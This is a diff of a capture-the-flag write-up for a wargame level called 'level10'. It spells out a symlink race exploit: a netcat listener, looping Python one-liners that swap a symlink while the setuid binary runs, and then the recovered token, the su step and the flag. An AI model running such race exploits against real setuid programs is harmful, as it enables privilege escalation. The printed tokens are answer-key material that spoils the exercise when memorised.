@@ -6,7 +6,7 @@
 👉 NOTES 🌟 Warning:  Using  access() ...
 
 
-🔻 Networking
+🔻 Network
 🌟 https://ru.wikipedia.org/wiki/Netcat
 ⬇️ nc -lk 6969 > /tmp/output &
 
@@ -21,27 +21,26 @@
 
 
 🔻 Before hack
+⬇️ echo token_test > /tmp/foo
+⬇️ ln -sf /tmp/foo /tmp/sym
+⬇️ ls -la /tmp/sym
 
-echo token_test > /tmp/foo
-ln -sf /tmp/foo /tmp/sym
-ls -la /tmp/sym
+⬇️ ln -sf /home/user/level10/token /tmp/sym
+⬇️ ls -la /tmp/sym
 
-ln -sf /home/user/level10/token /tmp/sym
-ls -la /tmp/sym
-
-python_one_line src: https://stackoverflow.com/a/35651859
-python -c $'import os\nimport time\nwhile True:\n\tprint("ok")\n\ttime.sleep(1)\n'
+🌟 python_one_line src: https://stackoverflow.com/a/35651859
+⬇️ python -c $'import os\nimport time\nwhile True:\n\tprint("ok")\n\ttime.sleep(1)\n'
 
 
 🔻 Hack
-rm /tmp/output; nc -lk 6969 > /tmp/output &
-echo token_test > /tmp/foo
-python -c $'import os\nwhile True:\n\tos.system("ln -sf {} {}".format("/tmp/foo", "/tmp/sym"))\n\tos.system("ln -sf {} {}".format("/home/user/level10/token", "/tmp/sym"))' &
-python -c $'import os\nfor _ in range(100):\n\tos.system("./level10 /tmp/sym 127.0.0.1")'
-
-cat /tmp/output
-
-kill %1
-kill %2
-
-woupa2yuojeeaaed06riuj63c
+⬇️ rm /tmp/output; nc -lk 6969 > /tmp/output &
+⬇️ echo token_test > /tmp/foo
+⬇️ python -c $'import os\nwhile True:\n\tos.system("ln -sf {} {}".format("/tmp/foo", "/tmp/sym"))\n\tos.system("ln -sf {} {}".format("/home/user/level10/token", "/tmp/sym"))' &
+⬇️ python -c $'import os\nfor _ in range(100):\n\tos.system("./level10 /tmp/sym 127.0.0.1")'
+⬇️ kill %1
+⬇️ kill %2
+⬇️ cat /tmp/output
+👉 woupa2yuojeeaaed06riuj63c
+⬇️ su flag10 ↪️ woupa2yuojeeaaed06riuj63c
+⬇️ getflag
+👉 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
